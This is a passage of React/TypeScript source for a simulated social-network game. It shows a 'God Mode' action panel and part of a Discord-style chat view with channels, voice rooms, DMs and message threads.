            </div>
          </div>
        ); })}
        {past.length > 0 && (
          <Section title="History">
            <div className="divide-y divide-line">{past.map((e) => (
              <div key={e.id} className="py-2 text-[13px]"><div className="font-semibold">{e.title}</div>
                <div className="text-muted">{e.resolved ? `${e.choices.find((c) => c.id === e.resolved!.choiceId)?.label} → ${e.resolved.outcome}` : "Ignored (expired)"}</div></div>
            ))}</div>
          </Section>
        )}
      </div>
    </div>
  );
}

```

## src/components/views/GodMode.tsx
```tsx
"use client";
import clsx from "clsx";
import { useState } from "react";
import { doAction, toast, useApp } from "../store";
import { Money } from "../ui";
import { ACTIONS, magnitudeFor, type ActionKind } from "@/lib/sim/topics";
import { fmtMoney } from "@/lib/sim/format";

export function GodMode() {
  const { world: w } = useApp();
  const s = w!;
  const [kind, setKind] = useState<ActionKind>("island");
  const def = ACTIONS.find((a) => a.kind === kind)!;
  const [name, setName] = useState("");
  const [pos, setPos] = useState(0.5);
  const [err, setErr] = useState<string>();
  const [lo, hi] = def.cost;
  const cost = hi === 0 ? 0 : Math.round(Math.exp(Math.log(lo) + (Math.log(hi) - Math.log(lo)) * pos) / 1e5) * 1e5;
  const mag = magnitudeFor(kind, cost);
  const run = () => {
    setErr(undefined);
    const r = doAction({ kind, name: name || def.names[0], cost });
    if (!r) return;
    if ("error" in r) { setErr(r.error); return; }
    if (!r.breaking) toast(`${def.icon} ${def.title} — rippling through ${r.servers.length} servers${r.articles.length ? `, ${r.articles.length} article` : ""}`);
    setName("");
  };
  return (
    <div className="h-full overflow-y-auto">
      <div className="mx-auto max-w-5xl p-3 md:p-6">
        <div className="mb-5 flex flex-wrap items-center justify-between gap-2">
          <div><h1 className="gold-text text-[30px] font-black tracking-tight">GOD MODE</h1><p className="text-[13px] text-muted">Make a move. The internet reacts in proportion. Cash: <Money v={s.player.cash} className="text-fg" /></p></div>
        </div>
        <div className="grid grid-cols-3 gap-2 sm:grid-cols-4 lg:grid-cols-6">
          {ACTIONS.map((a) => (
            <button key={a.kind} onClick={() => { setKind(a.kind); setName(""); setErr(undefined); }} className={clsx("panel flex flex-col items-center gap-1 p-3 text-center transition", kind === a.kind ? "glow border-gold" : "hover:border-fg/30")}>
              <span className="text-[26px]">{a.icon}</span><span className="text-[12px] font-semibold leading-tight">{a.title}</span>
            </button>
          ))}
        </div>
        <div className="panel mt-4 space-y-4 p-5">
          <div className="text-[18px] font-bold">{def.icon} {def.title}</div>
          <label className="block"><span className="text-[12px] uppercase tracking-wider text-muted">{def.prompt}</span>
            <input value={name} onChange={(e) => setName(e.target.value)} placeholder={def.names[0]} className="input mt-1 w-full" />
          </label>
          <div className="flex flex-wrap gap-1.5">{def.names.map((n) => <button key={n} onClick={() => setName(n)} className="rounded-full border border-line px-2.5 py-1 text-[12px] text-muted hover:text-fg">{n}</button>)}</div>
          {hi > 0 && (
            <label className="block"><div className="flex justify-between text-[12px] uppercase tracking-wider text-muted"><span>Spend</span><span className="num text-[16px] font-bold normal-case text-gold">{fmtMoney(cost)}</span></div>
              <input type="range" min={0} max={1} step={0.01} value={pos} onChange={(e) => setPos(Number(e.target.value))} className="mt-2 w-full accent-[var(--gold)]" />
              <div className="flex justify-between text-[11px] text-muted"><span>{fmtMoney(lo)}</span><span>{fmtMoney(hi)}</span></div>
            </label>
          )}
          <div>
            <div className="flex justify-between text-[12px] uppercase tracking-wider text-muted"><span>Expected internet impact</span><span className={clsx("num font-bold", mag >= 7 ? "text-down" : "text-fg")}>{mag.toFixed(1)} / 10 {mag >= 7 && "· BREAKING POINT"}</span></div>
            <div className="mt-1.5 h-2.5 overflow-hidden rounded-full bg-surface-3"><div className="h-full rounded-full transition-all" style={{ width: `${mag * 10}%`, background: mag >= 7 ? "linear-gradient(90deg,var(--gold),var(--down))" : "var(--gold)" }} /></div>
            <p className="mt-1.5 text-[12px] text-muted">{mag >= 7 ? "Trends worldwide, floods every server, triggers news coverage, influencer takes and memes." : mag >= 4.5 ? "Gets a news write-up and a trending tag." : "A few servers will notice."}</p>
          </div>
          {err && <div className="rounded-lg border border-down/40 bg-down/10 p-2.5 text-[13px] text-down">{err}</div>}
          <button onClick={run} className="btn btn-gold w-full py-3 text-[15px]">Do it</button>
        </div>
      </div>
    </div>
  );
}

```

## src/components/views/Lounge.tsx
```tsx
"use client";
import clsx from "clsx";
import { MemeImage } from "../MemeImage";
import { memo, useEffect, useLayoutEffect, useMemo, useRef, useState } from "react";
import { ArrowDown, AtSign, ChevronDown, Headphones, HeadphoneOff, Mic, MicOff, PhoneOff, Volume2, CornerUpLeft, Eye, Hash, Megaphone, Menu, MessageCircle, MessagesSquare, Pencil, Pin, Reply, Search, Send, SmilePlus, Trash2, Users, X } from "lucide-react";
import type { Route } from "../App";
import { haptic } from "../App";
import { doDelete, doEdit, doJoinVoice, doLeaveVoice, doPin, doReact, doSay, doStopTyping, doTyping, markRead, setFocus, useApp } from "../store";
import { overheardAt, speaking, voiceChannels, voiceRoster } from "@/lib/sim/presence";
import { Avatar, NameLine, RichText, go, who } from "../ui";
import { channelMessages, dmThreads, isEdited, localHour, pinnedIn, reactionsAt, textAt, threadMessages, typingIn, unreadIndex, type UnreadInfo } from "@/lib/sim/engine";
import { dmChannel, dmPeer } from "@/lib/sim/godspeak";
import { badgesFor, lastSeenMap, obsessionOf, OBSESSION_INFO, presenceOf, type Presence } from "@/lib/sim/social";
import { clockTime, dayOnly, fmtCount, relTime } from "@/lib/sim/format";
import type { Channel, Message, Reaction, Server, WorldState } from "@/lib/sim/types";

const MOD = "#5eead4";
const QUICK = ["👑", "🔥", "😭", "💀", "👀", "🫡"];
const PICKER = ["👑", "🔥", "😭", "💀", "👀", "🫡", "😂", "🤣", "❤️", "💯", "🙏", "👏", "🤡", "🧢", "🥶", "🐐", "📈", "📉", "💸", "🚀", "🤝", "😤", "🥹", "👋", "✅", "❌", "🍿", "🧠", "😐", "🙄"];
const DM_SERVER: Server = { id: "dm", name: "Direct Messages", icon: "💬", color: "#8a6416", description: "", bias: 0, vibe: "culture", tags: [], channels: [], members: [], moderators: [], memberCount: 0, insideJokes: [] };
const nickOf = (s: WorldState, id: string, srv: Server) => { const x = who(s, id); return x.char?.nicknames[srv.id] ?? x.name; };

/* ======================================================================= */

export function Lounge({ route }: { route: Route }) {
  const { world: w, now, lastRead } = useApp();
  const s = w!;
  const isDm = route.parts[0] === "dm";
  const srv = isDm ? DM_SERVER : s.servers.find((x) => x.id === route.parts[0]) ?? s.servers[0];
  const dms = useMemo(() => dmThreads(s, now), [s, now]);
  const dmId = isDm ? route.parts[1] ?? dms.find((d) => d.withGod)?.channelId ?? dms[0]?.channelId : undefined;
  const ch: Channel | undefined = isDm ? (dmId ? { id: dmId, name: "dm", topic: "", tags: [] } : undefined) : srv.channels.find((c) => c.id === route.parts[1]) ?? srv.channels.find((c) => c.name === "general") ?? srv.channels[0];
  const chId = ch?.id ?? "";
  const [drawer, setDrawer] = useState(false);
  // Member panel is tied to the channel it was opened in, so navigating (e.g. into a DM) closes it.
  const [membersFor, setMembersFor] = useState<string | null>(null);
  const members = !isDm && membersFor === chId;
  const setMembers = (v: boolean | ((m: boolean) => boolean)) => setMembersFor((cur) => ((typeof v === "function" ? v(cur === chId) : v) ? chId : null));
  const touch = useRef<{ x: number; y: number } | null>(null);
  const unread = unreadIndex(s, now, lastRead, now - 15 * 60e3);

  useEffect(() => { if (chId) markRead(chId); }, [chId, now]);
  useEffect(() => { setFocus(chId ? { serverId: srv.id, channelId: chId } : undefined); return () => setFocus(undefined); }, [srv.id, chId]);

  const onTouchStart = (e: React.TouchEvent) => { const t = e.touches[0]; touch.current = { x: t.clientX, y: t.clientY }; };
  const onTouchEnd = (e: React.TouchEvent) => {
    const st = touch.current; touch.current = null;
    if (!st || window.innerWidth >= 768) return;
    const t = e.changedTouches[0], dx = t.clientX - st.x, dy = t.clientY - st.y;
    if (Math.abs(dx) < 60 || Math.abs(dy) > Math.abs(dx) * 0.6) return;
    if (dx > 0) { if (members) setMembers(false); else setDrawer(true); }
    else { if (drawer) setDrawer(false); else if (!isDm) setMembers(true); }
  };
  const close = () => { setDrawer(false); setMembers(false); };
  useEffect(() => {
    if (!drawer && !members) return;
    const onKey = (e: KeyboardEvent) => { if (e.key === "Escape") { setDrawer(false); setMembersFor(null); } };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [drawer, members]);

  return (
    <div className="relative flex h-full overflow-clip" onTouchStart={onTouchStart} onTouchEnd={onTouchEnd}>
      <nav aria-label="Servers and channels" className={clsx("flex shrink-0 bg-bg",
        "max-md:absolute max-md:inset-y-0 max-md:left-0 max-md:z-40 max-md:w-[min(90vw,350px)] max-md:shadow-[8px_0_40px_rgba(0,0,0,0.5)] max-md:transition-transform max-md:duration-300 max-md:ease-[cubic-bezier(.2,.8,.2,1)]",
        drawer ? "max-md:translate-x-0" : "max-md:-translate-x-[105%]")}>
        <ServerRail s={s} srvId={srv.id} chId={chId} unread={unread} dms={dms} />
        {isDm
          ? <DmList s={s} now={now} chId={chId} dms={dms} unread={unread} onPick={() => setDrawer(false)} onClose={() => setDrawer(false)} />
          : <ChannelList s={s} srv={srv} chId={chId} now={now} unread={unread} onPick={() => setDrawer(false)} onClose={() => setDrawer(false)} />}
      </nav>
      <div onClick={close} className={clsx("absolute inset-0 z-30 bg-black/60 backdrop-blur-[2px] transition-opacity duration-300 md:hidden", drawer || members ? "opacity-100" : "pointer-events-none opacity-0")} />
      {ch
        ? <ChannelView key={chId} s={s} srv={srv} ch={ch} now={now} lastReadAt={lastRead[chId] ?? now - 15 * 60e3} route={route} onMenu={() => setDrawer(true)} onMembers={() => setMembers((m) => !m)} />
        : <EmptyDms onMenu={() => setDrawer(true)} />}
      {!isDm && <MemberList s={s} srv={srv} chId={chId} now={now} open={members} onClose={() => setMembers(false)} />}
    </div>
  );
}

/* ----------------------------- server rail ----------------------------- */

function Pill({ n, mention }: { n: number; mention?: boolean }) {
  if (!n) return null;
  return <span className={clsx("badge-bump num min-w-[18px] rounded-full px-1.5 text-center text-[10px] font-bold leading-[18px]", mention ? "bg-down text-white" : "bg-gold text-[#1a1406]")}>{n > 99 ? "99+" : n}</span>;
}

function ServerRail({ s, srvId, chId, unread, dms }: { s: WorldState; srvId: string; chId: string; unread: Map<string, UnreadInfo>; dms: ReturnType<typeof dmThreads> }) {
  const dmMentions = dms.filter((d) => d.withGod && d.channelId !== chId).reduce((a, d) => a + (unread.get(d.channelId)?.n ?? 0), 0);
  return (
    <div className="no-scrollbar flex w-[72px] shrink-0 flex-col items-center gap-2 overflow-y-auto border-r border-line bg-bg py-3">
      <button aria-label={`Direct messages${dmMentions ? `, ${dmMentions} unread` : ""}`} onClick={() => go("/lounge/dm")} className="relative mb-0.5 flex flex-col items-center gap-1 active:scale-95">
        <span className={clsx("grid size-12 place-items-center bg-gradient-to-br from-gold to-[#b9832a] text-[#1a1406] shadow-[0_6px_20px_rgb(var(--glow)/0.25)] transition-all duration-200", srvId === "dm" ? "rounded-2xl" : "rounded-full")}><MessagesSquare className="size-5" /></span>
        <span className="text-[9px] font-bold uppercase tracking-[0.18em] text-gold">Lounge</span>
        {dmMentions > 0 && <span className="absolute -right-1 top-7"><Pill n={dmMentions} mention /></span>}
      </button>
      <div className="h-px w-8 bg-line" />
      {s.servers.map((x) => {
        const active = x.id === srvId;
        let n = 0, m = 0;
        for (const c of x.channels) { if (c.id === chId) continue; const u = unread.get(c.id); if (u) { n += u.n; m += u.mentions; } }
        return (
          <button key={x.id} title={x.name} aria-label={`${x.name}${m ? `, ${m} mentions` : n ? ", unread" : ""}`} aria-current={active ? "true" : undefined} onClick={() => { haptic(5); go(`/lounge/${x.id}`); }} className="group relative flex w-full shrink-0 justify-center active:scale-95">
            <span className={clsx("absolute left-0 top-1/2 w-1 -translate-y-1/2 rounded-r-full bg-fg transition-all duration-200", active ? "h-9" : n ? "h-2" : "h-0 group-hover:h-5")} />
            <span className={clsx("grid size-12 place-items-center text-[21px] transition-all duration-200", active ? "rounded-2xl ring-2 ring-gold/70" : "rounded-full opacity-85 group-hover:rounded-2xl group-hover:opacity-100")}
              style={{ background: active ? `linear-gradient(140deg, ${x.color}, color-mix(in srgb, ${x.color} 55%, black))` : "var(--surface-3)" }}>{x.icon}</span>
            {m > 0 && <span className="absolute bottom-0 right-2"><Pill n={m} mention /></span>}
          </button>
        );
      })}
    </div>
  );
}

/* ----------------------------- channel list ---------------------------- */

const groupOf = (c: Channel) => (c.announce ? "Information" : /general|chat|off-?topic|lounge|meme|welcome|intro|vc|hangout/i.test(c.name) ? "Community" : "Topics");

function ChannelList({ s, srv, chId, now, unread, onPick, onClose }: { s: WorldState; srv: Server; chId: string; now: number; unread: Map<string, UnreadInfo>; onPick: () => void; onClose: () => void }) {
  const [collapsed, setCollapsed] = useState<Record<string, boolean>>({});
  const groups = ["Information", "Community", "Topics"].map((g) => [g, srv.channels.filter((c) => groupOf(c) === g)] as const).filter(([, cs]) => cs.length);
  const slot = Math.floor(now / 15000);
  const seen = useMemo(() => lastSeenMap(s, slot * 15000, srv.id, 3000), [s, srv.id, slot]);
  const online = srv.members.reduce((a, id) => a + (presenceOf(s.characters[Number(id.slice(1))], seen.get(id), now) === "online" ? 1 : 0), 0);
  return (
    <aside className="flex w-full min-w-0 flex-col border-r border-line bg-surface md:w-[248px]">
      <div className="relative overflow-hidden border-b border-line p-4 pt-5">
        <div className="pointer-events-none absolute inset-0 opacity-40" style={{ background: `radial-gradient(120% 90% at 0% 0%, ${srv.color}, transparent 70%)` }} />
        <div className="relative flex items-start justify-between gap-2">
          <h2 className="truncate text-[17px] font-bold tracking-tight">{srv.icon} {srv.name}</h2>
          <button aria-label="Close" className="grid size-9 shrink-0 place-items-center rounded-full bg-black/30 md:hidden" onClick={onClose}><X className="size-4" /></button>
        </div>
        <p className="relative mt-1 line-clamp-2 text-[12px] text-muted">{srv.description}</p>
        <div className="relative mt-2 flex items-center gap-3 text-[11px] text-muted">
          <span><span className="mr-1 inline-block size-2 rounded-full bg-up" />{online} regulars online</span>
          <span>{fmtCount(srv.memberCount)} members</span>
        </div>
      </div>
      <div className="flex-1 overflow-y-auto px-2 pb-2">
        {groups.map(([label, cs]) => {
          const shut = collapsed[label];
          return (
            <div key={label}>
              <button aria-expanded={!shut} onClick={() => setCollapsed((c) => ({ ...c, [label]: !c[label] }))} className="flex w-full items-center gap-1 px-1 pb-1 pt-4 text-[10.5px] font-semibold uppercase tracking-[0.14em] text-muted hover:text-fg">
                <ChevronDown className={clsx("size-3 transition-transform duration-200", shut && "-rotate-90")} />{label}
              </button>
              {cs.map((c) => {
                const u = c.id === chId ? undefined : unread.get(c.id);
                const on = c.id === chId;
                if (shut && !on && !u?.mentions) return null;
                return (
                  <button key={c.id} onClick={() => { haptic(5); go(`/lounge/${srv.id}/${c.id}`); onPick(); }} aria-current={on ? "page" : undefined}
                    className={clsx("relative flex min-h-[40px] w-full items-center gap-2 rounded-xl px-2.5 text-[14.5px] transition-colors md:min-h-[34px] md:text-[14px]", on ? "bg-gold/10 text-gold" : u ? "font-semibold text-fg hover:bg-surface-2" : "text-muted hover:bg-surface-2 hover:text-fg")}>
                    {u && !on && <span className="absolute -left-2 h-2 w-1 rounded-r-full bg-fg" />}
                    {c.announce ? <Megaphone className="size-4 shrink-0 opacity-70" /> : <Hash className="size-4 shrink-0 opacity-70" />}
                    <span className="truncate">{c.name}</span>
                    <span className="ml-auto">{u?.mentions ? <Pill n={u.mentions} mention /> : null}</span>
                  </button>
                );
              })}
            </div>
          );
        })}
        <VoiceList s={s} srv={srv} now={now} />
      </div>
      <MeBar s={s} />
    </aside>
  );
}

function VoiceList({ s, srv, now }: { s: WorldState; srv: Server; now: number }) {
  const [shut, setShut] = useState(false);
  const g = s.voice?.god && !s.voice.god.leftAt ? s.voice.god : undefined;
  return (
    <div data-testid="voice-list">
      <button aria-expanded={!shut} onClick={() => setShut(!shut)} className="flex w-full items-center gap-1 px-1 pb-1 pt-4 text-[10.5px] font-semibold uppercase tracking-[0.14em] text-muted hover:text-fg">
        <ChevronDown className={clsx("size-3 transition-transform duration-200", shut && "-rotate-90")} />Voice
      </button>
      {!shut && voiceChannels(srv).map((vc) => {
        const roster = voiceRoster(s, srv, vc.id, now);
        const here = g?.channelId === vc.id;
        return (
          <div key={vc.id} className={clsx("rounded-xl px-1 py-0.5", here && "bg-gold/[0.07]")}>
            <div className="flex min-h-[40px] items-center gap-2 px-1.5 md:min-h-[34px]">
              <Volume2 className={clsx("size-4 shrink-0", here ? "text-gold" : "opacity-70")} />
              <span className={clsx("truncate text-[14px]", here ? "font-semibold text-gold" : "text-muted")}>{vc.name}</span>
              <span className="num text-[10.5px] text-muted">{roster.length || ""}</span>
              {here
                ? <button onClick={() => { haptic(8); doLeaveVoice(); }} className="ml-auto flex items-center gap-1 rounded-full bg-down/15 px-2.5 py-1 text-[11.5px] font-semibold text-down"><PhoneOff className="size-3.5" />Leave</button>
                : <button onClick={() => { haptic(8); doJoinVoice(srv.id, vc.id); }} className="ml-auto rounded-full bg-surface-3 px-2.5 py-1 text-[11.5px] font-semibold text-fg hover:bg-gold hover:text-[#1a1406]">Join voice</button>}
            </div>
            {roster.length > 0 && (
              <ul className="mb-1 ml-7 space-y-0.5">
                {roster.slice(0, 9).map((m) => {
                  const x = who(s, m.id);
                  const talk = !m.muted && !m.deaf && speaking(m.id, now, m.god);
                  return (
                    <li key={m.id} className="flex items-center gap-2 text-[12.5px]" data-speaking={talk || undefined}>
                      <span className={clsx("rounded-full", talk && "vc-speaking")}><Avatar src={x.avatar} size={20} /></span>
                      <span className={clsx("truncate", m.god ? "font-semibold text-gold" : "text-fg/80")}>{m.god ? "God" : x.char?.nicknames[srv.id] ?? x.name}</span>
                      <span className="ml-auto flex items-center gap-1 pr-1 text-muted">
                        {m.muted && <MicOff aria-label="muted" className="size-3" />}
                        {m.deaf && <HeadphoneOff aria-label="deafened" className="size-3" />}
                      </span>
                    </li>
                  );
                })}
                {roster.length > 9 && <li className="text-[11px] text-muted">+{roster.length - 9} more</li>}
              </ul>
            )}
          </div>
        );
      })}
    </div>
  );
}

function VoiceBar({ s, srv, now }: { s: WorldState; srv: Server; now: number }) {
  const g = s.voice?.god;
  if (!g || g.leftAt) return null;
  const home = s.servers.find((x) => x.id === g.serverId);
  const vc = home && voiceChannels(home).find((v) => v.id === g.channelId);
  if (!home || !vc) return null;
  const lines = overheardAt(s, g.channelId, now, 3);
  const last = lines.at(-1);
  const talking = speaking("god", now, true);
  return (
    <div data-testid="voice-bar" className="flex items-center gap-2 border-b border-line bg-gold/[0.06] px-3 py-1.5 text-[12px]" onClick={(e) => e.stopPropagation()}>
      <span className={clsx("relative rounded-full", talking && "vc-speaking")}><Avatar src={who(s, "god").avatar} size={22} ring="var(--gold)" /></span>
      <span className="flex shrink-0 items-center gap-1.5 font-semibold text-gold">{talking ? <span className="vc-wave" aria-label="You are speaking"><i /><i /><i /><i /></span> : <Mic className="size-3.5" />}{vc.name}{home.id !== srv.id ? ` · ${home.name}` : ""}</span>
      <span className="min-w-0 flex-1 truncate text-muted" aria-live="off">{last ? <><b className="font-semibold text-fg/85">{who(s, last.who).char?.nicknames[home.id] ?? who(s, last.who).name}:</b> {last.text}</> : "connecting…"}</span>
      <Headphones className="size-3.5 shrink-0 text-muted" />
      <button aria-label="Leave voice" onClick={() => { haptic(8); doLeaveVoice(); }} className="grid size-7 shrink-0 place-items-center rounded-full bg-down/15 text-down"><PhoneOff className="size-3.5" /></button>
    </div>
  );
}

function MeBar({ s }: { s: WorldState }) {
  const me = who(s, "god");
  return (
    <div className="flex items-center gap-2.5 border-t border-line bg-bg/60 px-3 py-2.5 pb-[max(0.625rem,env(safe-area-inset-bottom))] md:pb-2.5">
      <span className="relative"><Avatar src={me.avatar} size={32} ring="var(--gold)" /><span className="absolute -bottom-0.5 -right-0.5 size-3 rounded-full border-2 border-bg bg-up" /></span>
      <div className="min-w-0 leading-tight"><div className="truncate text-[13px] font-semibold text-gold">{me.name}</div><div className="text-[11px] text-muted">@god · online</div></div>
    </div>
  );
}

/* -------------------------------- DMs ---------------------------------- */

function DmList({ s, now, chId, dms, unread, onPick, onClose }: { s: WorldState; now: number; chId: string; dms: ReturnType<typeof dmThreads>; unread: Map<string, UnreadInfo>; onPick: () => void; onClose: () => void }) {
  const mine = dms.filter((d) => d.withGod), others = dms.filter((d) => !d.withGod).slice(0, 25);
  const item = (d: (typeof dms)[number]) => {
    const ids = d.channelId.split(":").slice(1);
    const peer = d.withGod ? who(s, dmPeer(d.channelId)) : who(s, ids[0]);
    const other = d.withGod ? undefined : who(s, ids[1]);
    const u = d.channelId === chId ? undefined : unread.get(d.channelId);
    const lastBy = d.last.authorId === "god" ? "You: " : !d.withGod ? `${who(s, d.last.authorId).name}: ` : "";
    return (
      <button key={d.channelId} onClick={() => { go(`/lounge/dm/${d.channelId}`); onPick(); }} className={clsx("flex min-h-[52px] w-full items-center gap-2.5 rounded-xl px-2 py-1.5 text-left", d.channelId === chId ? "bg-gold/10" : "hover:bg-surface-2")}>
        <span className="relative shrink-0">
          <Avatar src={peer.avatar} size={36} />
          {other && <Avatar src={other.avatar} size={20} className="absolute -bottom-1 -right-1 ring-2 ring-surface" />}
        </span>
        <span className="min-w-0 flex-1">
          <span className={clsx("block truncate text-[14px]", u ? "font-bold" : "font-medium")}>{peer.name}{other ? ` & ${other.name}` : ""}</span>
          <span className="block truncate text-[12px] text-muted">{lastBy}{textAt(d.last, now)}</span>
        </span>
        <span className="flex shrink-0 flex-col items-end gap-1"><span className="text-[10px] text-muted">{relTime(d.last.t, now)}</span>{u && d.withGod ? <Pill n={u.n} mention /> : null}</span>
      </button>
    );
  };
  return (
    <aside className="flex w-full min-w-0 flex-col border-r border-line bg-surface md:w-[268px]">
      <div className="flex items-center justify-between border-b border-line p-4 pt-5">
        <h2 className="text-[17px] font-bold">Direct messages</h2>
        <button aria-label="Close" className="grid size-9 place-items-center rounded-full bg-surface-3 md:hidden" onClick={onClose}><X className="size-4" /></button>
      </div>
      <div className="flex-1 overflow-y-auto px-2 pb-2">
        <div className="px-2 pb-1 pt-3 text-[10.5px] font-semibold uppercase tracking-[0.14em] text-muted">Your DMs</div>
        {mine.length ? mine.map(item) : <p className="px-2 py-2 text-[12.5px] text-muted">No DMs yet. Open someone&apos;s profile or the member list and tap Message.</p>}
        {others.length > 0 && <div className="flex items-center gap-1.5 px-2 pb-1 pt-4 text-[10.5px] font-semibold uppercase tracking-[0.14em] text-muted"><Eye className="size-3" /> God sees every DM</div>}
        {others.map(item)}
      </div>
      <MeBar s={s} />
    </aside>
  );
}

function EmptyDms({ onMenu }: { onMenu: () => void }) {
  return (
    <section className="grid min-w-0 flex-1 place-items-center p-6 text-center">
      <div>
        <button aria-label="Open channels" onClick={onMenu} className="mx-auto mb-3 grid size-11 place-items-center rounded-full bg-surface-3 md:hidden"><Menu className="size-5" /></button>
        <MessageCircle className="mx-auto size-10 text-gold" />
        <p className="mt-2 text-[14px] text-muted">Pick a conversation, or message someone from the member list.</p>
      </div>
    </section>
  );
}

/* ----------------------------- channel view ---------------------------- */

function findMsg(s: WorldState, id?: string) {
  if (!id) return undefined;
  for (let i = s.messages.length - 1; i >= 0; i--) if (s.messages[i].id === id) return s.messages[i];
  return s.pending.find((x) => x.id === id);
}

function typingLabel(names: string[]) {
  if (names.length === 1) return <><b>{names[0]}</b> is typing…</>;
  if (names.length === 2) return <><b>{names[0]}</b> and <b>{names[1]}</b> are typing…</>;
  if (names.length === 3) return <><b>{names[0]}</b>, <b>{names[1]}</b> and <b>{names[2]}</b> are typing…</>;
  return <><b>{names[0]}</b>, <b>{names[1]}</b> and <b>{names.length - 2} others</b> are typing…</>;
}

type Panel = "search" | "pins" | { thread: string } | undefined;

function ChannelView({ s, srv, ch, now, lastReadAt, route, onMenu, onMembers }: { s: WorldState; srv: Server; ch: Channel; now: number; lastReadAt: number; route: Route; onMenu: () => void; onMembers: () => void }) {
  const isDm = srv.id === "dm";
  const jump = route.query.get("m") ?? undefined;
  const msgs = channelMessages(s, ch.id, now, jump ? 600 : 160);
  const scroller = useRef<HTMLDivElement>(null);
  const stick = useRef(true);
  const [readMark] = useState(lastReadAt); // "new messages" divider stays where it was when you opened the channel
  const [text, setText] = useState("");
  const [sel, setSel] = useState<string>();
  const [reply, setReply] = useState<Message>();
  const [editing, setEditing] = useState<Message>();
  const [picker, setPicker] = useState<string>();
  const [panel, setPanel] = useState<Panel>(() => (route.query.get("thread") ? { thread: route.query.get("thread")! } : undefined));
  const [scrolledUp, setScrolledUp] = useState(false);
  useEffect(() => {
    if (!panel) return;
    const onKey = (e: KeyboardEvent) => { if (e.key === "Escape") setPanel(undefined); };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [panel]);
  const [seenCount, setSeenCount] = useState(msgs.length);
  const lastId = msgs.at(-1)?.id;
  const peer = isDm ? who(s, dmPeer(ch.id)) : undefined;
  const withGod = !isDm || ch.id.split(":").includes("god");
  const title = isDm ? (withGod ? peer!.name : ch.id.split(":").slice(1).map((id) => who(s, id).name).join(" & ")) : ch.name;
  const pins = isDm ? [] : pinnedIn(s, ch.id, now);
  const threadCounts = useMemo(() => {
    const m = new Map<string, number>();
    for (const x of s.messages) if (x.threadOf && x.channelId === ch.id) m.set(x.threadOf, (m.get(x.threadOf) ?? 0) + 1);
    for (const x of s.pending) if (x.threadOf && x.channelId === ch.id && x.t <= now) m.set(x.threadOf, (m.get(x.threadOf) ?? 0) + 1);
    return m;
  }, [s, ch.id, now]);

  useLayoutEffect(() => {
    const el = scroller.current;
    if (!el) return;
    if (jump) {
      const t = el.querySelector(`[data-mid="${jump}"]`);
      // Scroll only the message list (scrollIntoView would also shift overflow-hidden ancestors).
      if (t) { const r = t.getBoundingClientRect(), e = el.getBoundingClientRect(); el.scrollTop += r.top - e.top - (e.height - r.height) / 2; stick.current = false; }
      return;
    }
    if (stick.current) el.scrollTop = el.scrollHeight;
  }, [lastId, jump]);

  // Keep a selected message's inline action bar fully visible above the composer.
  useLayoutEffect(() => {
    const el = scroller.current;
    const row = sel && el?.querySelector(`[data-mid="${sel}"]`);
    if (!el || !row) return;
    const r = row.getBoundingClientRect(), e = el.getBoundingClientRect();
    if (r.bottom > e.bottom - 8) el.scrollTop += r.bottom - e.bottom + 12;
  }, [sel]);
  const newBelow = scrolledUp ? Math.max(0, msgs.length - seenCount) : 0;
  const typingIds = typingIn(s, ch.id, now);
  const typing = typingIds.map((id) => nickOf(s, id, srv));

  const toBottom = () => { const el = scroller.current; if (el) el.scrollTo({ top: el.scrollHeight, behavior: "smooth" }); stick.current = true; setScrolledUp(false); if (jump) go(`/lounge/${srv.id}/${ch.id}`); };
  const send = () => {
    const t = text.trim();
    if (!t || ch.announce) return;
    haptic(10);
    if (editing) { if (t !== editing.text) doEdit(editing.id, t); setEditing(undefined); setText(""); return; }
    stick.current = true;
    doSay(srv.id, ch.id, t, reply?.id);
    setText(""); setReply(undefined); setSel(undefined);
    if (jump) go(`/lounge/${srv.id}/${ch.id}`);
  };
  // the room notices when god starts typing (debounced in the engine), and calms down if he clears it
  const onType = (v: string) => {
    if (!isDm && !editing && !ch.announce) {
      if (!text.trim() && v.trim()) doTyping(srv.id, ch.id);
      else if (text.trim() && !v.trim()) doStopTyping(ch.id);
    }
    setText(v);
  };
  const react = (id: string, emoji: string) => { haptic(6); doReact(id, emoji); setSel(undefined); setPicker(undefined); };
  const startEdit = (m: Message) => { setEditing(m); setText(m.text); setReply(undefined); setSel(undefined); };
  // @mention autocomplete
  const mq = /(?:^|\s)@([\w.]{0,20})$/.exec(text);
  const suggestions = useMemo(() => {
    if (!mq || isDm) return [];
    const q = mq[1].toLowerCase();
    const ids = [...new Set([...msgs.slice(-60).map((m) => m.authorId), ...srv.members])].filter((id) => id.startsWith("c"));
    return ids.map((id) => s.characters[Number(id.slice(1))]).filter((c) => c.username.toLowerCase().startsWith(q) || c.displayName.toLowerCase().startsWith(q)).slice(0, 5);
  }, [mq?.[1], ch.id]); // eslint-disable-line react-hooks/exhaustive-deps

  const thread = panel && typeof panel === "object" ? findMsg(s, panel.thread) : undefined;

  return (
    <section className="relative flex min-w-0 flex-1 flex-col" onClick={() => { setSel(undefined); setPicker(undefined); }}>
      <header className="flex h-[52px] shrink-0 items-center gap-1.5 border-b border-line px-2 md:px-4">
        <button aria-label="Open channels" onClick={(e) => { e.stopPropagation(); onMenu(); }} className="grid size-10 place-items-center rounded-full text-muted hover:bg-surface-2 md:hidden"><Menu className="size-5" /></button>
        {isDm ? <Avatar src={peer!.avatar} size={26} /> : ch.announce ? <Megaphone className="size-5 shrink-0 text-muted" /> : <Hash className="size-5 shrink-0 text-muted" />}
        <div className="min-w-0 flex-1 leading-tight">
          <div className="truncate text-[15.5px] font-bold">{title}</div>
          <div className="truncate text-[11.5px] text-muted">{isDm ? (withGod ? `@${peer!.handle}` : "A DM you're not part of") : `${srv.icon} ${srv.name} · ${ch.topic}`}</div>
        </div>
        <button aria-label="Search messages" onClick={(e) => { e.stopPropagation(); setPanel(panel === "search" ? undefined : "search"); }} className={clsx("grid size-10 place-items-center rounded-full hover:bg-surface-2", panel === "search" ? "text-gold" : "text-muted")}><Search className="size-[19px]" /></button>
        {!isDm && <button aria-label={`Pinned messages (${pins.length})`} onClick={(e) => { e.stopPropagation(); setPanel(panel === "pins" ? undefined : "pins"); }} className={clsx("relative grid size-10 place-items-center rounded-full hover:bg-surface-2", panel === "pins" ? "text-gold" : "text-muted")}><Pin className="size-[19px]" />{pins.length > 0 && <span className="num absolute right-1 top-1 text-[9px] font-bold text-gold">{pins.length}</span>}</button>}
